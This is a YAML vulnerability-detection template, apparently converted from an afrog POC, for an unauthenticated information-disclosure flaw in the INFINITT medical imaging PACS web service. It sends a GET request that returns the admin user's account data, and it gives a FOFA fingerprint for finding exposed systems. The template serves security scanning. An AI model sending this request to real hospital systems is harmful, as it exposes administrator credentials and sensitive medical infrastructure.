# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <USERID>admin</USERID>
          - <NewDataSet>
          - <web_user_login>
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin'
id: infinitt-getuserinfobyuserid-information-discosure
info:
  author: zan8in
  description: |-
    英飞达医学影像存档与通信系统在/webservices/WebUserLogin.asmx/接口处存在信息泄露漏洞，攻击者无需身份验证即可利用该漏洞获取系统后台管理员的账户密码信息，进而登录后台，导致系统安全性严重受损。
    fofa: "INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 英飞达医学影像存档与通信系统webservices接口存在信息泄露漏洞
  severity: high
  tags: infinitt,discosure,argus-import
